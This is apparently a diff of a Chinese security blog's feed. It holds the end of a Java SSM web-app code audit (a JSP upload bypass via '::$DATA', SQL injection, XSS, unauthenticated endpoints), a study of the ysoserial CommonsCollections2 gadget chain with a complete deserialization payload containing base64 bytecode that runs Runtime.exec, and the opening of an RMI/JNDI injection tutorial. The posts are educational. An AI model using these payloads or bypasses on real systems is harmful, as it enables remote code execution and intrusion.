+                String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());
+                if (fileType.contains(ext) &amp;&amp; !&quot;jsp&quot;.equals(ext)) {
+                    String filePath = this.getPath(request, ext, param);
+                    File file = new File(this.getProjectRootDirPath(request) + filePath);
+                    if (!file.getParentFile().exists()) {
+                        file.getParentFile().mkdirs();
+                    }
+
+                    uploadfile.transferTo(file);
+                    return this.responseData(filePath, 0, &quot;上传成功&quot;, response);
+                } else {
+                    return this.responseErrorData(response, 1, &quot;文件格式错误，上传失败。&quot;);
+                }
+            }
+        } catch (Exception var13) {
+            logger.error(&quot;gok4()--error&quot;, var13);
+            return this.responseErrorData(response, 2, &quot;系统繁忙，上传失败&quot;);
+        }
+    }
+</code></pre>
+<p>唯一的过滤是在<code>if (fileType.contains(ext) &amp;&amp; !&quot;jsp&quot;.equals(ext))</code><br>
+fileType是我们可以控的，但是后缀不能够为jsp，这时就可以使用末尾添加::$DATA截断上传。<br>
+成功上传jsp文件<br>
+<img src="https://0xwi11.github.io/post-images/1635064071596.png" alt="" loading="lazy"></p>
+<p>还存在另外一个任意文件上传点<code>/video/uploadvideo</code>，而且没有后缀限制。</p>
+<h1 id="32-sql注入">3.2 SQL注入</h1>
+<p>在mybatis中，如果Mapper中的语句传递参数使用的是<code>${}</code>而不是<code>#{}</code>的话就会发生sql注入问题，#{}在底层是使用了预编译来实现的（PrepareStatement）。<br>
+如果说项目使用了mybatis的话，有一种方法可以快速的找出可能存在的sql注入问题。<br>
+在IDEA界面 <code>ctrl + shift + f</code> 搜索 <code>${</code><br>
+就可以找出大部分的sql注入问题。<br>
+<img src="https://0xwi11.github.io/post-images/1635064078019.png" alt="" loading="lazy"><br>
+我们来看看这个<code>deleteCourseFavoritesById</code><br>
+<img src="https://0xwi11.github.io/post-images/1635064083444.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1635064841580.png" alt="" loading="lazy"><br>
+可以看到是根本没有任何过滤的，在配置文件中也没有看到关于的过滤。<br>
+于是可以直接注入<br>
+<img src="https://0xwi11.github.io/post-images/1635064094436.png" alt="" loading="lazy"></p>
+<p>注入点也不止这一个，大多都是相似的就不多说。</p>
+<h1 id="4-controller">4. Controller</h1>
+<p>可能存在问题的功能点看完了，可以依次看看Controller</p>
+<h1 id="41-反射型xss">4.1 反射型XSS</h1>
+<p>在IDEA下方的Spring窗口中依次查看Controller，首先先跳过需要鉴权的admin目录，看到<code>DialogController.class</code>文件。<br>
+<img src="https://0xwi11.github.io/post-images/1635064945719.png" alt="" loading="lazy"></p>
+<pre><code class="language-java">@RequestMapping({&quot;/common/dialog&quot;})
+    public String getDialog(HttpServletRequest request, Model model) {
+        try {
+            Map&lt;String, Object&gt; mapDialog = new HashMap();
+            mapDialog.put(&quot;title&quot;, request.getParameter(&quot;title&quot;));
+            mapDialog.put(&quot;context&quot;, request.getParameter(&quot;context&quot;));
+            mapDialog.put(&quot;height&quot;, request.getParameter(&quot;height&quot;) == null ? 157 : request.getParameter(&quot;height&quot;));
+            model.addAttribute(&quot;dialog&quot;, mapDialog);
+            return &quot;/common/dialog&quot;;
+        } catch (Exception var4) {
+            logger.error(&quot;getDialog&quot;, var4);
+            return this.setExceptionRequest(request, var4);
+        }
+    }
+</code></pre>
+<p>代码的意思就是从请求中获取参数，然后再返回到视图，中间好像没有任何过滤，试一试XSS payload。<br>
+<img src="https://0xwi11.github.io/post-images/1635064158607.png" alt="" loading="lazy"><br>
+<img src="https://0xwi11.github.io/post-images/1635064162516.png" alt="" loading="lazy"><br>
+成功弹窗</p>
+<h1 id="42-用户信息泄露">4.2 用户信息泄露</h1>
+<p>从配置文件我们可以知道 <code>admin</code> 和 <code>uc</code> 目录都有相关的鉴权操作，但是发现到一些可疑的路由<br>
+<img src="https://0xwi11.github.io/post-images/1635064188247.png" alt="" loading="lazy"><br>
+尝试不带Cookie访问<br>
+<img src="https://0xwi11.github.io/post-images/1635064177283.png" alt="" loading="lazy"><br>
+如果是国外的SRC这算是严重漏洞了。<br>
+当然其他的端点也有同样的问题，这里就不重复说了。<br>
+这一部分我并没践行好，没有将所有的Controller看完，毕竟通读所有代码还是比较耗时的。</p>
+<h1 id="5工具审计">5.工具审计</h1>
+<p>我这里使用的是fortify，扫描用了半个小时。<br>
+看了一遍除了sql注入之外，没有很好可以直接利用的漏洞<br>
+<img src="https://0xwi11.github.io/post-images/1635064192639.png" alt="" loading="lazy"></p>
+<h1 id="小结">小结</h1>
+<p>对于这个系统我并没有进行彻底的审计，但是从上面的漏洞看来此系统在设计之初并没有考虑到安全设计的方面，所以导致存在很多简单但又有危害的漏洞。<br>
+其实对于一般web应用来说代码审计并不是很难的事情，SSM框架审计漏洞的方式同正常的java代码审计没有区别，网上有很多非常优秀的java代码审计文章，关于每个漏洞的审计方式写的都非常全面，我们需要的就只是将其移植到SSM框架的审计中来，我们明白SSM的执行流程了，自然就明白了该怎么在SSM框架中跟踪参数。</p>
+<h1 id="参考资料">参考资料</h1>
+<p><a href="https://paper.seebug.org/1075/#3-ssm">https://paper.seebug.org/1075/#3-ssm</a><br>
+<a href="https://p0rz9.github.io/2019/05/11/SSM%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/">https://p0rz9.github.io/2019/05/11/SSM%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</a><br>
+<a href="https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be">https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be<br>
+</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ysoserial CommonsCollections2 学习]]></title>
+        <id>https://0xwi11.github.io/post/ysoserial-commonscollections-2/</id>
+        <link href="https://0xwi11.github.io/post/ysoserial-commonscollections-2/">
+        </link>
+        <updated>2021-10-14T09:39:53.000Z</updated>
+        <content type="html"><![CDATA[<p>面试遇到很多人问CC2，重新学习一下。</p>
+<h1 id="commons-collections">Commons Collections</h1>
+<p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。</p>
+<p>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
+<p>因为很多生产环境中都使用了这个包，所以说此包中的反序列化成为了java反序列化中经典的利用链，有很多反序列化漏洞就是使用其中的反序列化链比如说fastjson。本篇文章主要简单的介绍cc2链。</p>
+<h1 id="1-前置知识">1、前置知识</h1>
+<p>在介绍cc2链之前需要掌握几个关于java的知识。</p>
+<h1 id="11-java反射机制">1.1 java反射机制</h1>
+<p>反射（Reflection） 是 Java 程序开发语言的特征之一，它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。在程序运行时，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种动态的获取信息以及动态调用对象的方法的功能称为 java 的反射机制。<br>
+java中每一个类都会有与之相关联的Class类实例一一对应。<br>
+每编译一个新类就会产生一个与之对应的Class类，这个Class类是由JVM和通过调用类加载器中的defineClass方法自动构造的。</p>
+<p><strong>Class类有四种方法来获取</strong></p>
+<pre><code class="language-java">// 1.通过字符串获取Class对象，这个字符串必须带上完整路径名，进行类初始化
+Class studentClass = Class.forName(&quot;com.test.reflection.Student&quot;);
+// 2.通过类的class属性，不进行类初始化
+Class studentClass2 = Student.class;
+// 3.通过对象的getClass()函数
+Student studentObject = new Student();
+Class studentClass3 = studentObject.getClass();
+// 4.通过classloader获取，不进行类初始化
+ClassLoader  classLoader = this.getClass().getClassLoader();
+Class  clazz5 = classLoader.loadClass(&quot;com.test.reflection.Student&quot;);
+</code></pre>
+<p><strong>创建实例大概有三种方法</strong></p>
+<p><strong>1.公有无参构造方法</strong><br>
+<code>class.newInstance()</code></p>
+<pre><code class="language-java">Monkey mk = Monkey.class.newInstance();
+</code></pre>
+<p>只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过<code>Class.newInstance()</code>来调用。</p>
+<p><strong>2.公有含参构造方法</strong><br>
+同时这种方式也可以获取公有无参构造方法</p>
+<pre><code class="language-java">Constructor getConstructor(Class&lt;?&gt;... parameterTypes);
+Constructor[] getConstructors();
+</code></pre>
+<p><strong>3.私有构造方法</strong><br>
+同时这种方式也可以获取公有方法</p>
+<pre><code class="language-java">Constructor getDeclaredConstructor(Class&lt;?&gt;... parameterTypes);
+Constructor[] getDeclaredConstructors();
+
+Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); 
+Constructor m = clazz.getDeclaredConstructor(); 
+m.setAccessible(true); 
+clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
+</code></pre>
+<p><strong>调用反射类的方法</strong></p>
+<pre><code class="language-java">Method getMethod(name, Class…)
+public Object invoke(Object obj, Object... args)
+</code></pre>
+<p>如果说我们要使用的方法需要传入一个<code>String</code>类型的<code>name</code>参数，那么在getMethod时候就要填充<code>String</code> 对应的Class对象 <code>String.class</code>，在invoke的时候填充<code>String</code>对象<code>&quot;Xiao ming&quot;</code></p>
+<p>实例代码，以下代码相当于调用了<code>new ProcessBuilder(&quot;calc&quot;).start();</code></p>
+<pre><code class="language-java">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);
+//获取构造方法
+Method getConstructorMethod = clazz.getClass().getMethod(&quot;getConstructor&quot;, Class[].class);//因为...特性这里也可传入Class[].class效果相同
+//传入参数返回构造方法
+Object b = getConstructorMethod.invoke(clazz, new Object[]{new Class[]{String[].class}});
+//利用返回的构造方法来创建对象
+Method newInstanceMethod = b.getClass().getMethod(&quot;newInstance&quot;, new Class[]{Object[].class});
+//调用方法传入cmd参数之后创建对象
+Object d = newInstanceMethod.invoke(b, new Object[]{new String[][]{{&quot;calc&quot;}}});
+//获得start方法
+Method startMethod = d.getClass().getMethod(&quot;start&quot;, new Class[]{});
+//调用start方法
+startMethod.invoke(d, new Object[]{});
+</code></pre>
+<h1 id="12-利用javassist操作字节码">1.2 利用Javassist操作字节码</h1>
+<blockquote>
+<p>JAVAssist( JAVA Programming ASSISTant ) 是一个开源的分析 , 编辑 , 创建 Java字节码( Class )的类库 . 他允许开发者自由的在一个已经编译好的类中添加新的方法，或者是修改已有的方法。对Javassist简单的理解，我们使用java反射机制动态的获取和修改对象中的成员变量，同时使用Javassist动态的获取和修改对象中的方法。</p>
+</blockquote>
+<p>这里借用别人的代码，使用方法</p>
+<pre><code class="language-java">package com.reflect;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import java.io.IOException;
+
+public class test4 {
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
+        ClassPool pool = ClassPool.getDefault();//获取类搜索路径（从默认的JVM类搜索路径搜索）
+        CtClass clazz = pool.get(test4.class.getName());//将test4类放入hashtable并返回CtClass对象
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;;
+        clazz.makeClassInitializer().insertBefore(cmd);//在static前面插入
+        clazz.makeClassInitializer().insertAfter(cmd);//在static后面插入
+        String Name = &quot;hehehe&quot;;
+        clazz.setName(Name);//设置类名
+        clazz.writeFile(&quot;./a.class&quot;);//写入文件
+    }
+}
+</code></pre>
+<p>这段代码首先试获取test4的Class对象，然后通过<code>makeClassInitializer()</code>插入我们的静态代码<code>cmd</code>，在java中类加载的时候会自动运行静态代码块中的代码。<br>
+写入的文件如下<br>
+<img src="https://0xwi11.github.io/post-images/1635080041203.png" alt="" loading="lazy"></p>
+<h1 id="13-加载字节码">1.3 加载字节码</h1>
+<p>ClassLoader类 核心方法：<br>
+1.loadClass(String className)，根据名字加载一个类。<br>
+2.defineClass(String name, byte[] b, int off, int len)，将一个字节流定义为一个类。<br>
+3.findClass(String name)，查找一个类。<br>
+4.findLoadedClass(String name)，在已加载的类中，查找一个类。<br>
+5.resolveClass(链接指定的Java类)</p>
+<p>利用defineClass()，我们可以通过byte动态的加载一个类</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class classloadertest extends ClassLoader{
+    private static String testclassname= &quot;com.test.test&quot;;
+    //转换byte后的字节码
+    private static byte[] classbytes= new byte[]{-54, -2, -70, -66, 0, 0, 0, 52, 0, 29, 10, 0, 6, 0, 15, 9, 0, 16, 0, 17, 8, 0, 18, 10, 0, 19, 0, 20, 7, 0, 21, 7, 0, 22, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 116, 101, 115, 116, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 23, 12, 0, 24, 0, 25, 1, 0, 17, -23, -114, -75, -47, -122, -18, -108, -111, -23, -114, -76, -26, -124, -84, -27, -89, -101, 7, 0, 26, 12, 0, 27, 0, 28, 1, 0, 13, 99, 111, 109, 47, 116, 101, 115, 116, 47, 116, 101, 115, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 9, 0, 11, 0, 12, 0, 1, 0, 9, 0, 0, 0, 37, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 5, 0, 8, 0, 6, 0, 1, 0, 13, 0, 0, 0, 2, 0, 14};
+
+
+    @Override
+    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+        //只处理com.test.test类
+        if (name.equals(testclassname)) {
+          //将一个字节流定义为一个类。
+            return defineClass(testclassname, classbytes, 0, classbytes.length);
+        }
+        return super.findClass(name);
+    }
+
+    public static void main(String[] args) throws Exception {
+        //创建加载器
+        classloadertest classloadertest = new classloadertest();
+        //使用我们自定义的类去加载testclassname
+        Class aClass = classloadertest.loadClass(testclassname);
+        //反射创建test类对象
+        Object o = aClass.newInstance();
+        //反射获取method方法
+        Method method = o.getClass().getMethod(&quot;method&quot;);
+        //反射去调用执行method方法
+        String str = (String) method.invoke(o);
+        System.out.println(str);
+    }
+}
+</code></pre>
+<h1 id="2-命令执行点">2、命令执行点</h1>
+<p>命令执行的点是由<code>TemplatesImpl</code>类触发的，是因为其中的<code>newTransformer</code>方法可以用来通过字节码来创建实例。<br>
+简单的跟进一下<br>
+<img src="https://0xwi11.github.io/post-images/1635081030675.png" alt="" loading="lazy"><br>
+进入<code>getTransletInstance</code><br>
+<img src="https://0xwi11.github.io/post-images/1635081032987.png" alt="" loading="lazy"><br>
+进入<code>defineTransletClasses</code><br>
+<img src="https://0xwi11.github.io/post-images/1635081042292.png" alt="" loading="lazy"><br>
+<code>defineClass</code>来装载字节码<br>
+<img src="https://0xwi11.github.io/post-images/1635081046711.png" alt="" loading="lazy"><br>
+最后创建实例，此时我们写在静态代码块或构造方法中的恶意代码就已经执行了。<br>
+这里借用别人的图可以更好的理解。<br>
+<img src="https://0xwi11.github.io/post-images/1635081248838.png" alt="" loading="lazy"></p>
+<p>至此恶意代码是如何能够运行我们已经弄清楚了，接下来我们如何去触发<code>newTransformer</code>方法呢？</p>
+<h1 id="3-反序列化入口">3、反序列化入口</h1>
+<p><code>PriorityQueue</code>类重写了其<code>readObject</code>方法，<br>
+<img src="https://0xwi11.github.io/post-images/1635081423953.png" alt="" loading="lazy"><br>
+跟进入<code>heapify</code>方法<br>
+<img src="https://0xwi11.github.io/post-images/1635081511298.png" alt="" loading="lazy"><br>
+跟进<code>siftDownUsingComparator</code>方法<br>
+<img src="https://0xwi11.github.io/post-images/1635081579017.png" alt="" loading="lazy"><br>
+可以看到调用了比较器的<code>compare</code>方法<br>
+而<code>TransformingComparator</code>类的<code>compare</code>方法，调用了熟悉的<code>transform</code>方法。<br>
+<img src="https://0xwi11.github.io/post-images/1635081719658.png" alt="" loading="lazy"><br>
+<code>InvokeTransformer</code>的<code>transform</code>方法可以用来调用传入对象的任意方法。所以在这里我们可以用其调用我们上面<code>TemplatesImpl</code>类的<code>newTransformer</code>方法来执行我们的恶意代码。</p>
+<p>这里借用别人的图，完整的链就成了下图所示<br>
+<img src="https://0xwi11.github.io/post-images/1635081971122.png" alt="" loading="lazy"></p>
+<p><strong>梳理一下</strong><br>
+1、<code>TemplatesImpl</code>类的<code>newTransformer</code>方法可以通过加载字节码来执行我们的恶意代码。<br>
+2、<code>InvokeTransformer</code>的<code>transform</code>方法可以用来调用传入对象的任意方法。<br>
+3、<code>TransformingComparator</code>类的<code>compare</code>方法中调用了<code>transform</code>方法。<br>
+4、<code>PriorityQueue</code>类<code>readObject</code>方法中调用了比较器的<code>compare</code>方法。<br>
+5、反序列化时会自动调用<code>readObject</code>方法</p>
+<h1 id="4-payload">4、Payload</h1>
+<pre><code class="language-java">public class cc2_1 {
+
+    public static void main(String[] args) throws Exception {
+        //构造恶意类TestTemplatesImpl转换为字节码并进行base64编码
+        byte[] bytes = Base64.decode(&quot;yv66vgAAADEAMQoACAAhCgAiACMIACQKACIAJQcAJgoABQAnBwAoBwApAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAaTGNvbS9jYy9UZXN0VGVtcGxhdGVzSW1wbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEMAAkACgcAKwwALAAtAQAEY2FsYwwALgAvAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMAAKAQAYY29tL2NjL1Rlc3RUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAZgACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAABABIAEwACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFgANAAAAIAADAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABYAFwACABgAAAAEAAEAGQABABIAGgACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAYAAAABAABABkAAQAfAAAAAgAg&quot;);
+        //反射创建TemplatesImpl
+        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]{});
+        Object TemplatesImpl_instance = constructor.newInstance();
+        //将恶意类的字节码设置给_bytecodes属性
+        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(TemplatesImpl_instance , new byte[][]{bytes});
+        //设置属性_name为恶意类名
+        Field name = aClass.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);
+
+
+        Field _tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfactory.setAccessible(true);
+        _tfactory.set(TemplatesImpl_instance ,  new TransformerFactoryImpl());
+
+        //传递给TransformingComparator
+        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);
+        TransformingComparator transformer_comparator =new TransformingComparator(transformer);
+
+        PriorityQueue queue = new PriorityQueue(2);
+        //queue.add(1);
+        //queue.add(1);
+        //设置comparator属性
+        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,transformer_comparator);
+
+        Field field2=queue.getClass().getDeclaredField(&quot;size&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,2);
+        //设置queue属性
+        field=queue.getClass().getDeclaredField(&quot;queue&quot;);
+        field.setAccessible(true);
+        //数组中必须添加2个元素
+        Object[] objects = new Object[]{TemplatesImpl_instance , TemplatesImpl_instance};
+        field.set(queue,objects);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object object = ois.readObject();
+
+    }
+}
+</code></pre>
+<p><strong>关于add(1)</strong><br>
+在刚开始学习的时候对于利用代码中的add(1)，非常的不解，后来经过实验可以用以下代码去代替add(1)，其实是成员变量size的限制，进行比较需要两个元素以上。</p>
+<pre><code class="language-java">        Field field2=queue.getClass().getDeclaredField(&quot;size&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,2);
+</code></pre>
+<h1 id="5-小结">5、小结</h1>
+<p>在对基础知识熟悉之后，CC链其实还是比较好理解的，相关的类其实代码量不多，自己动手看看代码很好理解，只要理解好CC1和CC2的链，其他的链不过也就是利用不同的类来触发特定的方法比如<code>transform</code>。</p>
+<h1 id="参考资料">参考资料:</h1>
+<p><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a><br>
+<a href="https://xz.aliyun.com/t/1756#toc-3">https://xz.aliyun.com/t/1756#toc-3</a><br>
+<a href="https://www.anquanke.com/post/id/232592#h2-16">https://www.anquanke.com/post/id/232592#h2-16</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JNDI注入和unserialize学习]]></title>
+        <id>https://0xwi11.github.io/post/jndi-zhu-ru-he-unserialize-xue-xi/</id>
+        <link href="https://0xwi11.github.io/post/jndi-zhu-ru-he-unserialize-xue-xi/">
+        </link>
+        <updated>2021-09-30T04:25:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="java-rmi">Java RMI</h2>
+<p>RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。<br>
+RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。<br>
+这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。<br>
+<img src="https://0xwi11.github.io/post-images/1678595437633.png" alt="" loading="lazy"></p>
+<p>如上图所示，在JVM之间通信时，客户端要调用远程服务器上的对象时，并不是直接将远程对象拷贝到本地，而是通过传递一个stub。</p>
+<p>其中stub就包含了远程服务器的地址和端口等信息，可以看作是远程对象的引用，客户端可以通过调用stub中的方法来对远程对象进行使用，也就是上图所说的逻辑上的调用，而非直接调用，即真实的数据是从客户端到服务端远程对象的stub(存根)到服务器的skeleton(骨架)之间的socket通信。</p>
+<p>实际上client并不知道远程服务器的通信地址和端口，但是服务器对象存根(stub)中有这些信息，那么客户端只要拿到stub，通过调用stub上的方法，然后stub再连接到远程服务器的具体端口，服务器执行client所请求的具体方法，再讲运行结果返回给stub，stub再将结果返回给client，此时client表面上看起来即为在本地执行了远程服务器上指定对象的方法，而这个执行过程对client实际上是透明的。</p>
+<p>至于如何获取stub，常见方法为通过RMI注册表(RMIRegistry)来解决这个问题，RMIRegistry也为远程对象，此时监听在1099端口，注册远程对象需要RMI URL 和一个远程对象的引用(实际上就是一个路由对应着一个远程服务器上类的实例化对象)。而此时客户端首先可以通过RMI注册表查询到远程对象的名称，先获取stub，然后来调用该stub来调用远程对象所属类中的方法。</p>
+<p>比如如下例子：</p>
+<p>远程服务端：</p>
+<pre><code class="language-java">IHello rhello = new HelloImpl();
+LocateRegistry.createRegistry(1099);
+Naming.bind(&quot;rmi://0.0.0.0:1099/hello&quot;, rhello);
+</code></pre>
+<p>此时远程服务端RMI注册表监听1099端口，并设置RMI URL和对应该URL的类对象</p>
+<p>客户端：</p>
+<pre><code class="language-java">Registry registry = LocateRegistry.getRegistry(&quot;远程服务器地址&quot;,1099);
+IHello rhello = (IHello) registry.lookup(&quot;hello&quot;);
+rhello.sayHello(&quot;test&quot;);
+</code></pre>
+<p>此时客户端访问远程服务器RMI注册表，得到该RMI注册表的对象，此时再访问其中URL中的hello，即可以获得服务器端绑定到hello的类的对象，此时就可以进行调用sayHello方法，其中方法是在服务端执行的，服务端执行结束将返回结果返回给客户端，即在整个流程客户端也就完成了对远程服务器上的对象的使用。</p>
+<p><strong>动态加载类：</strong><br>
+这点根据我的理解应该是服务端可以将不同的url与类写到RMI注册表中，当客户端的jvm想要调用某个类时，可以根据服务端传递过来的url去远程下载类对应的class文件到本地来进行调用。</p>
+<h2 id="jndi注入">JNDI注入</h2>
+<p><strong>JNDI介绍</strong><br>
+第一部分已经说过我们可以通过url和对象写到rmi注册表中，此时客户端可以通过url来对远程对象进行加载，而jndi为java服务和目录接口，JNDI提供统一的客户端API，通过不同的访问提供者接口,JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互，所以我们可以通过jdni来访问远程的url来获取我们需要的服务，那么如果服务端将对象注册到RMI注册表中，我们即可以通过jndi来对此对象进行访问。每一个对象都有键值对，与名字和对象进行绑定，可以通过名字来对对象进行访问，对象可能存储在rmi、ldap中。</p>
+<p>java可以将对象存储在naming或者directory服务下，提供了naming reference功能，其中对象绑定到reference上，存储在naming或者directory服务下，(rmi,ldap等)。在使用reference的时候，将对象绑定到构造方法中，从而在被调用的时候触发。<br>
+<strong>案例</strong><br>
+person类(位于远程服务器上，也就是我们想要调用的类)</p>
+<pre><code class="language-java">package JavaUnser;
+import java.io.Serializable;
+import java.rmi.Remote;
+public class Person implements Remote,Serializable {
+    private static final long serialVersionUID = 1L;
+    private String name;
+    private String password;
